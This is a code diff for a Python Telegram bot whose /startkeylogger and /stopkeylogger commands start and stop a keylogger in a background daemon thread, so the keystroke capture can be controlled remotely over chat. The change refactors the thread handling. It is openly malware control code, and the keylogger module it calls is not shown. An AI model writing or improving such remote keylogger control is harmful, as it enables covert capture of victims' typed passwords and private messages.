@@ -13,6 +13,8 @@ API_HASH = os.getenv("API_HASH")  # Telegram API Hash
 
 # Initialize the Telegram bot
 bot = telebot.TeleBot(BOT_TOKEN)
+keylogger_thread = None
+
 
 WEBHOOK_URL = os.getenv("WEBHOOK_URL")
 
@@ -158,23 +160,22 @@ def log_responses(message):
 # Start Keylogger Command
 @bot.message_handler(commands=['startkeylogger'])
 def start_keylogger(message):
-    global keylogger_process
-    if keylogger_process is None or not keylogger_process.is_alive():
+    global keylogger_thread
+    if keylogger_thread is None or not keylogger_thread.is_alive():
         bot.reply_to(message, "🔄 Starting the keylogger...")
-        keylogger_process = threading.Thread(target=keylogger.start_keylogger, args=("keylogs.txt",))
-        keylogger_process.start()
+        keylogger_thread = threading.Thread(target=keylogger.start_keylogger, daemon=True)
+        keylogger_thread.start()
         bot.reply_to(message, "✅ Keylogger started successfully.")
     else:
         bot.reply_to(message, "⚠️ Keylogger is already running.")
 
-# Stop Keylogger Command
 @bot.message_handler(commands=['stopkeylogger'])
 def stop_keylogger(message):
-    global keylogger_process
-    if keylogger_process and keylogger_process.is_alive():
-        keylogger.stop_keylogger()  # Stop keylogger (requires implementation in keylogger script)
-        keylogger_process.join()
-        keylogger_process = None
+    global keylogger_thread
+    if keylogger_thread and keylogger_thread.is_alive():
+        keylogger.stop_keylogger()
+        keylogger_thread.join()
+        keylogger_thread = None
         bot.reply_to(message, "✅ Keylogger stopped successfully.")
     else:
         bot.reply_to(message, "⚠️ Keylogger is not running.")
